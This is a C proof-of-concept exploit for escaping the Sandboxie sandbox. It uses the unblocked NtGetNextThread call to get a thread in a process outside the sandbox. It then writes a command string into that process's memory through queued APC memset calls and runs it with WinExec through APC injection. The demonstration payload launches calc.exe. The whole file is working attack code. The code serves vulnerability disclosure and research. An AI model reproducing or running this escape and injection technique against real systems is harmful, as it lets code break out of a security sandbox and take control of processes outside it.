/* Sandboxie breakout vulnerability PoC
 * Author: hx1997
 */

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

typedef NTSTATUS (NTAPI *pfnNtGetNextThread)(HANDLE, HANDLE, int, DWORD, DWORD, HANDLE *);
typedef NTSTATUS (NTAPI *pfnNtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, ULONG);

DWORD getFreeSpace(HANDLE hProcess) {
	MEMORY_BASIC_INFORMATION mbi;
	mbi.RegionSize = 0x1000;
	
	for (DWORD lpAddress = 0; lpAddress < 0x80000000; lpAddress += mbi.RegionSize) {
		VirtualQueryEx(hProcess, (LPCVOID)lpAddress, &mbi, sizeof(mbi));
		if ((mbi.State == MEM_COMMIT) && (mbi.Type == MEM_MAPPED) && (mbi.Protect == PAGE_READWRITE)) {
			return lpAddress;
		}
	}
	
	return -1;
}

int foo(DWORD dwProcessId) {
	HMODULE hModule = GetModuleHandle("ntdll.dll");
	pfnNtGetNextThread pNtGetNextThread = (pfnNtGetNextThread)GetProcAddress(hModule, "NtGetNextThread");
	pfnNtQueueApcThread pNtQueueApcThread = (pfnNtQueueApcThread)GetProcAddress(hModule, "NtQueueApcThread");
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, 0, dwProcessId);
	if (!hProcess) {
		return -1;
	}
	
	// BOOM! Sandboxie doesn't block NtGetNextThread, so we can get access to threads outside the box.
	HANDLE hThread = 0;
	if (pNtGetNextThread(hProcess, 0, THREAD_SET_CONTEXT, 0, 0, &hThread) < 0) {
		CloseHandle(hProcess);
		return -1;
	}
	
	// This write primitive courtesy of Amit Klein, Itzik Kotler at Safebreach in their paper
	// https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf
	DWORD target_payload = getFreeSpace(hProcess);
	if (target_payload == -1) {
		printf("Can't find free space in the target process!\n");
		CloseHandle(hProcess);
		CloseHandle(hThread);
		return -1;
	}
	
	printf("Found free space at %p\n", target_payload);
	char payload[] = "C:\\WINDOWS\\System32\\calc.exe";
	for (int i = 0; i < sizeof(payload); i++)
	{
		pNtQueueApcThread(hThread, (PVOID)GetProcAddress(hModule, "memset"),
		(void*)(target_payload+i), (void*)*(((BYTE*)payload)+i), 1);
	}
	
	// do the classic APC injection
	NTSTATUS ret = pNtQueueApcThread(hThread, (PVOID)WinExec, (PVOID)target_payload, 0, 0);
	if (ret < 0) {
		printf("NtQueueApcThread failed with %x\n", ret);
		CloseHandle(hProcess);
		CloseHandle(hThread);
		return -1;
	}
	
	CloseHandle(hProcess);
	CloseHandle(hThread);
	return 0;
}

int main(void) {
	DWORD dwProcessId = 0;
	printf("Enter a PID outside the sandbox (e.g. PID of iexplore.exe): ");
	scanf("%d", &dwProcessId);
	if (foo(dwProcessId) < 0) {
		printf("Injection failed!\n");
	} else {
		printf("Injection suceeded!\n");
	}
	system("pause");
	return 0;
}